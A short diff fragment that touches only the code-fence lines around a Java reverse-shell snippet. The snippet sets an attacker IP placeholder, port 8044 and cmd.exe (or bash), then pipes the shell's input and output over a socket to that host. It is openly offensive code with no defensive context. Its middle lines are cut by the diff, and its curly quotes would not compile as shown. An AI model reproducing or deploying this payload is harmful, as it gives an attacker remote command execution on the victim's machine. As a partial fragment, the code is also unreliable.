@@ -1,4 +1,4 @@
-```
+
 String host=”localhost”;                               ##attacker ip address goes here
 int port=8044;                                         ## input the attacker port number
 String cmd=”cmd.exe”;                                  ## you can change this to 'bash'
@@ -11,4 +11,3 @@ while(si.available()>0)po.write(si.read());
 so.flush();po.flush();Thread.sleep(50);
 try {p.exitValue();break;}catch (Exception e){}};p.destroy();
 s.close();
-```
